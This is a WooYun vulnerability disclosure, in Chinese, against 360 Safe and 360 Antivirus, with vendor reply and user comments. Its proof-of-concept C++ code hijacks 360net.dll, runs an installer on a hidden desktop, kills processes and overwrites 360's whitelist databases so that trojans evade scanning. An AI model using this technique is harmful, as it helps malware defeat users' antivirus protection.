{"id": 36715, "wybug_id": "wooyun-2015-096329", "wybug_title": "提权替换360信任列表数据库添加目录到扫描白名单（木马躲避杀毒技巧）", "wybug_corp": "奇虎360", "wybug_author": "路人甲", "wybug_date": "2015-02-25 15:29", "wybug_open_date": "2015-05-27 10:18", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向公众公开  简要描述： 提升权限将特定目录添加到360安全卫士和杀毒的白名单中。 详细说明：  通过创建虚拟桌面提升自身权限,释放原设定好的白名单数据库文件替换掉现有白名单数据库文件speedmem2.hg和sl2.db，达到添加制定目录为信任目录的结果，致使木马逃避掉360杀毒的扫描。\n\n\n\n   漏洞证明：  提升提升权限部分:\nHINSTANCE hInstance = NULL;DWORD WINAPI MainBacak(LPVOID lpParameter){\tSetPriorityClass( GetCurrentProcess(), HIGH_PRIORITY_CLASS );\t\tchar MydirPath[MAX_PATH];\tSHGetSpecialFolderPath(NULL,MydirPath,CSIDL_PROFILE,0);\tCHAR MyDir[MAX_PATH];\twsprintf(MyDir,\"%s\\\\Local Settings\\\\Temp\\\\\",MydirPath);\tconst int buf_size = 1024;\tCHAR buf[buf_size];\tDWORD dwBufWrittenSize;\tHANDLE hDir;\thDir = CreateFile(MyDir, FILE_LIST_DIRECTORY,FILE_SHARE_READ|FILE_SHARE_DELETE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS, NULL); \tif (hDir == INVALID_HANDLE_VALUE)\t{\t\tCloseHandle(hDir); \t\texit(0);\t}\twhile(1)\t{\t\tif(ReadDirectoryChangesW(hDir, &buf, buf_size, TRUE ,\t\t\tFILE_NOTIFY_CHANGE_FILE_NAME|            FILE_NOTIFY_CHANGE_DIR_NAME|            FILE_NOTIFY_CHANGE_ATTRIBUTES|            FILE_NOTIFY_CHANGE_SIZE|            FILE_NOTIFY_CHANGE_LAST_WRITE|            FILE_NOTIFY_CHANGE_LAST_ACCESS|            FILE_NOTIFY_CHANGE_CREATION|            FILE_NOTIFY_CHANGE_SECURITY,\t\t\t&dwBufWrittenSize, NULL, NULL))\t\t{\t\t\tFILE_NOTIFY_INFORMATION * pfiNotifyInfo = (FILE_NOTIFY_INFORMATION*)buf;\t\t\tchar* pszMultiByte;\t\t\tpszMultiByte = new char[512];\t\t\tZeroMemory( pszMultiByte, 512);\t\t\tWideCharToMultiByte(CP_ACP, 0,pfiNotifyInfo->FileName, pfiNotifyInfo->FileNameLength/2, pszMultiByte, 512, NULL, NULL);\t\t\t\t\t\tchar *p;\t\t\tp=strstr(pszMultiByte,\"360net.dll\");\t\t\tif(p!=NULL)\t\t\t{\t\t\t\t\tchar tmp360net[MAX_PATH]={0};\t\t\t\tlstrcpy(tmp360net,pszMultiByte);\t\t\t\t\tswitch(pfiNotifyInfo->Action) \t\t\t\t{ \t\t\t\tcase FILE_ACTION_ADDED: \t\t\t\t\t\tdelete []pszMultiByte;\t\t\t\t\tbreak; \t\t\t\tcase FILE_ACTION_REMOVED:\t\t\t\t\tdelete []pszMultiByte;\t\t\t\t\tbreak; \t\t\t\tcase FILE_ACTION_MODIFIED: \t\t\t\tlstrcat(MyDir,tmp360net);\t\t\t\t\tif (CopyFile(\"Dll.dll\",MyDir,FALSE)!=0)\t\t\t\t\t{\t\t\t\t\t\tdelete []pszMultiByte;\t\t\t\t\t\tCloseHandle(hDir); \t\t\t\t\t\treturn 1;\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\telse\t\t\t\t\t{\t\t\t\t\t\tdelete []pszMultiByte;\t\t\t\t\t\treturn 0;\t\t\t\t\t\tbreak; \t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\tdefault: \t\t\t\t\tbreak; \t\t\t\t}\t\t\t}\t\t\t\t\t}\t\t\t}\t\t\t\tCloseHandle(hDir); \treturn 0;\t}DWORD WINAPI MainDesk(LPVOID lpParameter){        HDESK hDesk = CreateDesktop(\"Virtual\",\t\tNULL,\t\tNULL,\t\tDF_ALLOWOTHERACCOUNTHOOK, \t\tDESKTOP_CREATEWINDOW|\t\tDESKTOP_ENUMERATE|\t\tDESKTOP_READOBJECTS|\t\tDESKTOP_WRITEOBJECTS|\t\tDESKTOP_HOOKCONTROL , \t\tNULL\t\t);\tSTARTUPINFO si = {sizeof(si)};\tsi.lpDesktop = \"Virtual\";\tsi.dwFlags = STARTF_USESHOWWINDOW;\tsi.wShowWindow = SW_HIDE;\tPROCESS_INFORMATION pi = {0};\tif(!CreateProcess(NULL,(LPSTR)(LPCSTR)lpParameter, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))\t{\t\tCloseHandle(pi.hThread);\t\tCloseHandle(pi.hProcess);\t\tCloseDesktop(hDesk);\t\treturn 0;\t}\treturn 1;}int main(int argc, char* argv[]){\tchar safe[MAX_PATH];\tHKEY hkey; \tDWORD type = REG_SZ; \t\t\t\tDWORD buffSize=sizeof(safe); \tif(RegOpenKeyEx(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360safe.exe\",NULL,KEY_READ,&hkey)==ERROR_SUCCESS)\t{\t\tRegQueryValueEx(hkey,\"Path\",NULL,&type,(LPBYTE)safe,&buffSize);\t\tRegCloseKey(hkey);\t}\telse\t{\t\tif(RegOpenKeyEx(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360safe.exe\",NULL,KEY_READ,&hkey)==ERROR_SUCCESS)\t\t{\t\t\tRegQueryValueEx(hkey,\"Path\",NULL,&type,(LPBYTE)safe,&buffSize);\t\t\tRegCloseKey(hkey);\t\t}\t}\tchar tmp360safe[MAX_PATH]={0};\tlstrcpy(tmp360safe,safe);\tlstrcat(tmp360safe,\"\\\\modules\\\\360Inst.exe\");\tchar MyDir[MAX_PATH];\tSHGetSpecialFolderPath(NULL,MyDir,CSIDL_PROFILE,0);\tstrcat(MyDir,\"\\\\Local Settings\\\\Temp\\\\\");\tMessageBox(NULL,MyDir,NULL,NULL);\tExitProcess(0);\tif (access(tmp360safe,0)==0)\t{\t\twhile(1)\t\t{\t\t\tHANDLE handle[2];\t\t\thandle[1]=CreateThread(NULL,NULL,MainBacak,NULL,CREATE_SUSPENDED,NULL);\t\t\tSetThreadPriority(handle[1],THREAD_PRIORITY_HIGHEST);  \t\t\tResumeThread(handle[1]);              handle[2]=CreateThread(NULL,NULL,MainDesk,tmp360safe,CREATE_SUSPENDED,NULL);\t\t\tSetThreadPriority(handle[2],THREAD_PRIORITY_LOWEST);  \t\t\tResumeThread(handle[2]);\t\t\tWaitForSingleObject(handle[2],INFINITE);\t\t\tDWORD lpExitCode2;\t\t\tGetExitCodeThread(handle[2],&lpExitCode2);\t\t\tif (lpExitCode2==0)\t\t\t{\t\t\t\tCloseHandle(handle[2]);\t\t\t\tCloseHandle(handle[1]);\t\t\t\tcontinue;\t\t\t}\t\t\tWaitForSingleObject(handle[1],INFINITE);\t\t\tDWORD lpExitCode;\t\t\tGetExitCodeThread(handle[1],&lpExitCode);\t\t\tif (lpExitCode==1)\t\t\t{\t\t\t\tCloseHandle(handle[1]);\t\t\t\tCloseHandle(handle[2]);\t\t\t\tSleep(15000);\t\t\t}\t\t\telse\t\t\t{\t\t\t\tCloseHandle(handle[1]);\t\t\t\tCloseHandle(handle[2]);\t\t\t}\t\t}\t}\t\treturn 0;}\n替换白名单数据库部分:\nint Storm(int count){\tunsigned long Time=GetTickCount();\tint seed=rand()+3;\tseed=(seed*Time)%count;\treturn seed;}BOOL CALLBACK EnumWindowsProc(HWND hwnd,LPARAM IParam)//回调函数{    PostMessage(hwnd, WM_CLOSE, 0, 0);\treturn TRUE;}extern \"C\" __declspec(dllexport)void HttpCreateDownloadObj(){    char taskkill[MAX_PATH];\twsprintf(taskkill,\"taskkill /im load.exe /f\");\tWinExec(taskkill,SW_HIDE);\tEnumWindows(EnumWindowsProc,0);\tchar safe[MAX_PATH];\tchar SD[MAX_PATH];\tHKEY hkey; \tDWORD type = REG_SZ; \t\t\t\tDWORD buffSize=sizeof(safe); \tDWORD buffSize1=sizeof(SD); \tif(RegOpenKeyEx(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360safe.exe\",NULL,KEY_READ,&hkey)==ERROR_SUCCESS)\t{\t\tRegQueryValueEx(hkey,\"Path\",NULL,&type,(LPBYTE)safe,&buffSize);\t\tRegCloseKey(hkey);\t}\telse\t{\t\tif(RegOpenKeyEx(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360safe.exe\",NULL,KEY_READ,&hkey)==ERROR_SUCCESS)\t\t{\t\t\tRegQueryValueEx(hkey,\"Path\",NULL,&type,(LPBYTE)safe,&buffSize);\t\t\tRegCloseKey(hkey);\t\t}\t}\t\tif(RegOpenKeyEx(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360sd.exe\",NULL,KEY_READ,&hkey)==ERROR_SUCCESS)\t{\t\tRegQueryValueEx(hkey,\"Path\",NULL,&type,(LPBYTE)SD,&buffSize1);\t\tRegCloseKey(hkey);\t}\telse\t{\t\tif(RegOpenKeyEx(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360sd.exe\",NULL,KEY_READ,&hkey)==ERROR_SUCCESS)\t\t{\t\t\tRegQueryValueEx(hkey,\"Path\",NULL,&type,(LPBYTE)SD,&buffSize1);\t\t\tRegCloseKey(hkey);\t\t}\t}\tchar tmp360safe[MAX_PATH]={0};\tlstrcpy(tmp360safe,safe);\tlstrcat(tmp360safe,\"\\\\modules\\\\360Inst.exe\");\tchar MydirPath[MAX_PATH];\tSHGetSpecialFolderPath(NULL,MydirPath,CSIDL_PROFILE,0);\tCHAR MyDir[MAX_PATH];\twsprintf(MyDir,\"%s\\\\Local Settings\\\\Temp\\\\\",MydirPath);\tCHAR speedmem[MAX_PATH];\twsprintf(speedmem,\"%s\\\\sp%cedm%cm.hg\",MyDir,'a'+Storm(26),'a'+Storm(26));\tCHAR slD[MAX_PATH];\twsprintf(slD,\"%s\\\\s%cefmm%c.ds\",MyDir,'a'+Storm(26),'a'+Storm(26));\tspeedmemSaveFile(speedmem);\tsdSaveFile(slD);\tCHAR Newspeedmem[MAX_PATH];\twsprintf(Newspeedmem,\"%s\\\\deepscan\\\\speedmem2.hg\",safe);\tCHAR NewslD[MAX_PATH];\twsprintf(NewslD,\"%s\\\\sl2.db\",SD);\tDeleteFile(Newspeedmem);\tDeleteFile(NewslD);\tCopyFile(speedmem,Newspeedmem,FALSE);\tCopyFile(slD,NewslD,FALSE);\tDeleteFile(speedmem);\tDeleteFile(slD);    return;}\nspeedmemSaveFile与sdSaveFile分别是生成了之前在360杀毒和360安全卫视下设定好路径的白名单数据库文件。   修复方案：  你们自然晓得怎么修复啦:P   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-26 10:17 厂商回复： 感谢乌云白帽子的报告此问题是通过360安全卫士中一处防御缺陷突破信任机制实现的白名单篡改。 我们在一个月以前就已经从其它渠道获知了该漏洞并进行了修复和升级，目前外网的最新版360都不存在此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-25 15:33 |    \t\t无心、 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:20        | 你不是风儿，我也不是沙，再怎么缠绵也到不...)\t\t \n  前排。    \n     2015-02-25 15:45 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:48        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  看热闹来了    \n     2015-02-25 15:47 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  想法挺有趣    \n     2015-02-25 16:02 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        )\t\t \n  我就看热闹……    \n     2015-02-25 16:03 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  @疯狗 狗哥求审核漏洞哇~http://www.wooyun.org/bugs/wooyun-2015-098220/trace/d3696fac6fedfc73e5b9cb3414e41f22 http://www.wooyun.org/bugs/wooyun-2015-098218/trace/7ede802f3e44c53f6bd9c619d4cdfb58 http://www.wooyun.org/bugs/wooyun-2015-098216/trace/8622604ba8dbab65162a1716ffd597d6 http://www.wooyun.org/bugs/wooyun-2015-098214/trace/d5f7b1cdff61c342ea8180df5ab97902 http://www.wooyun.org/bugs/wooyun-2015-098213/trace/7afe8ec3e38a4f0ca605bbe66410cab9 http://www.wooyun.org/bugs/wooyun-2015-098182/trace/f63e50138f738b4520247685231d625b http://www.wooyun.org/bugs/wooyun-2015-098181/trace/3e84e04ccad83703fa88cc5da607d53a http://www.wooyun.org/bugs/wooyun-2015-098086/trace/bbba155e0342206751099e13e46988a2 http://www.wooyun.org/bugs/wooyun-2015-098085/trace/a7013d64e1e464e91f768c93532ce809 http://www.wooyun.org/bugs/wooyun-2015-098080/trace/e201246320266c46147badb5ae8cd253 http://www.wooyun.org/bugs/wooyun-2015-097988/trace/fc118e708b58889b3eb32f22364952d7 http://www.wooyun.org/bugs/wooyun-2015-097890/trace/df69ebc6823c8cc505a360c92fb8aa16 http://www.wooyun.org/bugs/wooyun-2015-097754/trace/5cc4b0424a2adacabb6b34d50ef910af http://www.wooyun.org/bugs/wooyun-2015-095786/trace/0a7e573a6b7cb12b7421ec5a745456ae http://www.wooyun.org/bugs/wooyun-2015-094879/trace/63d9f708ea64bbe409f578cc0f769aa5    \n     2015-02-25 19:32 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  能不能把360加到黑名单……    \n     2015-02-25 20:14 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  还以为把360提权了呢    \n     2015-02-25 21:17 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:38        | 呵呵！)\t\t \n  360的白名单目录你找得到吗？    \n     2015-05-27 10:43 |    \t\tmilan \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:32        | 妈妈说：搬不完砖就别回家。)\t\t \n  @浅蓝   哥 你命真苦 都没审核通过    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}